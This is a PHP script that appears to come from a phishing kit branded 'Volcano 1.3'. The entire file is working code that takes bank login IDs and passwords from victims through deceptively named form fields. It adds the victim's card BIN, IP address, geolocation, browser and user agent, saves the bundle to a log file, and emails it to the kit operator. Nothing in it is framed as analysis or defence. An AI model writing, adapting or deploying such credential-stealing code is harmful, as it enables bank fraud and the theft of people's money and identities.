<?php include'../proxy.php';?>
<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

        $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
		
		$ids = $_POST['zip'];
		$pust = $_POST['city'];
		
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>Bank login ".$_SESSION['card_bin']."</b> <br><hr>\n";
				
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[ID]</font></b>           :<b>".$ids."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Pass]</font></b>        :<b>".$pust."</b> <br><hr>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[DEVICE INFO]</font></b>:</b> <br>\n";
		$MESSAGE.="IP ADDRESS   : {$_SESSION['ip']}"."<br>";
		$MESSAGE.="LOCATION     : {$_SESSION['country']}"."<br>";
		$MESSAGE.="BROWSER      : {$_SESSION['os']}"."<br>";
		$MESSAGE.="USER AGENT   : {$_SESSION['agent']}"."<br>";
		$MESSAGE = wordwrap($MESSAGE,70);

		$SUBJECT = "Bank Login | ".$_SESSION['bill_name']." | $IP | $COUNTRYCODE";
        $headers  = "From: Volcano 1.3 <mail@volcano.org>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
		$be=md5 (rand(0,100000));
        $myfile = fopen("../logs/Bank-".$be."gs.html", "a+");
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
		  if ($config_smtp == 1){
      foreach(explode(",", $email_results) as $tomail) {
    $api->ngesend($tomail, $SUBJECT, $MESSAGE);
      }
  } else {
      foreach(explode(",", $email_results) as $tomail) {
    mail($tomail, $SUBJECT, $MESSAGE, $headers);
      }
  }
        exit(done);
?>
